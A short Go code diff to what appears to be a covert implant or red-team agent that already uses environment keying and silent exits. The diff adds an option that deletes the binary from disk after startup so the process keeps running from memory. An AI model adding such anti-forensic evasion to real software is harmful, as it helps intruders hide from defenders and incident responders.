@@ -54,6 +54,7 @@ var (
 	envKeyDomain      string = ""     // Environment key: domain must match this regex
 	envKeyUsername    string = ""     // Environment key: username must match this regex
 	envKeyProcess     string = ""     // Environment key: this process must be running
+	selfDelete        string = ""     // Self-delete binary from disk after execution starts
 )
 
 func main() {
@@ -113,6 +114,11 @@ func runAgent() {
 	// Check environment keys — exit silently if any check fails (no network activity)
 	if !checkEnvironmentKeys() {
 		os.Exit(0)
+	}
+
+	// Self-delete: remove binary from disk after startup (process continues from memory)
+	if selfDelete == "true" {
+		selfDeleteBinary()
 	}
 
 	// Parse working hours configuration
